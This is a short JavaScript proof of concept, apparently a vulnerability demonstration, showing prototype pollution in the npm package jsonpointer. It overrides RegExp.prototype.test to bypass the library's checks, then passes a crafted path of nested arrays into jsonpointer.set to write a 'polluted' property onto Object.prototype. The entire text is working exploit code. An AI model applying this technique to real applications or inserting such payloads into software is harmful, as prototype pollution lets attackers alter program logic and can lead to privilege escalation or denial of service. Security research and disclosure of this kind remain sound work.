RegExp.prototype.test = () => true;
const jsonpointer = require('jsonpointer');
console.log({}.polluted);
jsonpointer.set({}, [
    ['proto'],
    ['__proto__'],
    'polluted'
], 'yes');
console.log({}.polluted);